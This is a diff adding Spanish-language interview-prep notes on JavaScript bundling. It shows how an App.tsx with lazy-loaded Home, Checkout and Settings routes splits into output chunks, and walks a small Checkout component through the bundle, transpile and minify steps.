+      └─ App.tsx
+           ├─ (estático) Layout, Router     → chunk inicial
+           ├─ import() Home                → chunk Home
+           │    └─ Button                  → shared (si también lo usa Checkout)
+           ├─ import() Checkout            → chunk Checkout
+           └─ import() Settings            → chunk Settings
+    ```
+    Salida típica en `dist/`:
+    ```
+    dist/assets/
+      index-aaa.js       ← entry: main, router, shell
+      Home-bbb.js
+      Checkout-ccc.js
+      Settings-ddd.js
+      Button-eee.js      ← o un shared-*.js si el bundler agrupa comunes
+      vendor-fff.js      ← react, react-dom (cache largo)
+    ```
+    Al abrir `/checkout`: (1) el HTML carga `index-aaa.js`; (2) el
+    router hace match; (3) el `import()` dispara la descarga de
+    `Checkout-ccc.js` (+ shared/vendor si hacen falta).
+
+    Los tres pasos sobre un módulo concreto:
+    ```tsx
+    // pages/Checkout.tsx (fuente)
+    import { Button } from '../components/Button';
+
+    export function Checkout() {
+      const total: number = 10;
+      return <Button onClick={() => alert(total)}>Pagar</Button>;
+    }
+    ```
+    1. **Bundle** — Checkout + su grafo entran en `Checkout-*.js` (Button
+       puede ir a shared).
+    2. **Transpile** — JSX → runtime; desaparece la anotación `: number`.
+    3. **Minify** — nombres cortos, sin espacios → un `.js` denso.
+
+    Frase de entrevista: *el bundler construye un grafo desde el entry y
+    emite chunks; sin lazy routes sueles tener un bundle grande; con
+    `import()` dinámico obtienes chunks por ruta (o por punto de corte)
+    más chunks compartidos para código común.*
 
 - Vite vs Webpack: por qué Vite es más rápido en desarrollo
 
